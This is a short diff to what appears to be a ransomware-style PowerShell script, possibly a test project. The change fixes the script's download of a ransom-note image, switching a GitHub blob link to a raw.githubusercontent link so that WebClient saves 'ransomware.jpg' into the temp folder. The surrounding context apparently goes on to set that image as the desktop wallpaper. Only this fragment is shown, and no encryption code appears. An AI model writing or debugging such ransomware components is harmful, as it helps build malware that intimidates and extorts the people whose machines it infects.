@@ -53,7 +53,7 @@ $utf8Bom = New-Object System.Text.UTF8Encoding $true
 
 # --- FOND D'ECRAN DEPUIS GITHUB ---
 $wallpaperPath = "$env:TEMP\ransom_wallpaper.jpg"
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/asmaerouel/MesTest/blob/a6821a436ce5a48ac7ecf14060d587aa06f26c08/ransomware.jpg", $wallpaperPath)
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/asmaerouel/MesTest/refs/heads/main/ransomware.jpg", $wallpaperPath)
 
 Add-Type -TypeDefinition @"
 using System;
